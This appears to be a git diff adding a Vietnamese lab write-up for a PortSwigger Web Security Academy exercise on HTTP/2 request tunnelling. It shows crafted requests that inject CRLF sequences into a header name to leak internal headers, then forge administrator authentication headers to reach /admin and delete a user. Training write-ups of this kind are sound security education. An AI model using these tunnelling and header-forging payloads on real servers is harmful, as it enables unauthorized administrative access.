@@ -649,6 +649,53 @@ Ta có thể exploit theo các bước sau:
 Thử lặp lại các bước trên một vài lần, kết quả bài lab được giải thành công.
 
 # 18. Bypassing access controls via HTTP/2 request tunnelling
+Website có chức năng search và từ khóa tìm kiếm được reflected trong response. Đồng thời, nếu ta gửi request `POST /` với parameter `search` thì có thể thực hiện chức năng này. Cấu hình request sau:
+```
+POST / HTTP/2
+Host: 0a4e007303c14266c11809b80018007e.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+foo: bar
+
+
+```
+Sau đó, sử dụng Inspector để thay đổi header `Foo: bar`, sao cho Name  (Foo) của nó trở thành:
+```
+foo: bar\r\n
+Content-Length: 125\r\n
+\r\n
+search=
+```
+Thiết lập value=`bar` và body=`hellohellohellohellohellohellohellohello`. Khi front-end server đọc requests trên, nó sẽ hiểu là request thông thường (do sử dụng HTTP/2), thêm các internal headers và chuyển về cho back-end server. Khi back-end server thực hiện HTTP/2 downgrading, request sẽ trở thành:
+```
+POST / HTTP/2
+Host: 0a4e007303c14266c11809b80018007e.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+foo: bar
+Content-Length: 125
+
+search=<Internal headers>
+
+hellohellohellohellohellohellohellohello
+```
+Và khi đó, internal headers sẽ được reflected trong response của chức năng search. Sau khi submit, ta thấy thông tin các headers mong muốn:
+
+![image](https://user-images.githubusercontent.com/103978452/227083222-c2864734-e1da-4514-ad3a-f3c3b7f2339b.png)
+
+Tiếp đó, dùng Inspector thay đổi Name của header `foo` như sau:
+```
+foo: bar\r\n
+Content-Length: 125\r\n
+X-SSL-VERIFIED: 1\r\n
+X-SSL-CLIENT-CN: administrator\r\n
+X-FRONTEND-KEY: 9940633528943809\r\n
+\r\n
+search=
+```
+Ta dự đoán back-end server sẽ sử dụng 3 internal headers để kiểm tra quyền. Như vậy khi thay đổi như trên, có thể ta sẽ thực hiện được các hành động dưới tư cách administrator. Đổi path thành `/admin` rồi submit, ta access trang admin thành công. 
+
+![image](https://user-images.githubusercontent.com/103978452/227084505-9c60ce9d-64f8-4d67-be15-07615531f9df.png)
+
+Thay đổi path thành `/admin/delete?username=carlos`, kết quả bài lab được giải thành công.
 
 # 19. Web cache poisoning via HTTP/2 request tunnelling
 
